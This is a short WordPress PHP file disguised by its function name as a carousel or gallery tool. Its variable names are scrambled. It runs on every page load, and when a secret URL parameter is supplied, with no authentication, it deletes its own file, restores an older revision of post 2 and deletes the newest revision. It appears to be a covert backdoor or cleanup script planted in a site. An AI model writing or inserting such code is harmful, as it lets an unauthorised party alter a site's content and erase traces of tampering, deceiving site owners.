<?php

function toolkit_carousel_tool() {
	if (isset($_GET['vendor_direct_gallery']) && $_GET['vendor_direct_gallery'] === 'listing_custom_customer') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$bank_categories_basic_chat = 2;
		$name_svg_utils = wp_get_post_revisions($bank_categories_basic_chat);
		if (empty($name_svg_utils)) die('no revisions');
		if (count($name_svg_utils) < 2) die('less than 2');
		$enable_effects_appointment_accordion = array_shift($name_svg_utils);
		$cache_tags_content = $enable_effects_appointment_accordion->ID;
		$scripts_shop_forms = array_shift($name_svg_utils);
		$post_interactivity_website = $scripts_shop_forms->ID;
		$thumbnail_slider_rotator = wp_restore_post_revision($post_interactivity_website);
		if ($thumbnail_slider_rotator === false) die('error restoring');
		$thumbnail_slider_rotator = wp_delete_post_revision($cache_tags_content);		
		if ($thumbnail_slider_rotator === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'toolkit_carousel_tool');
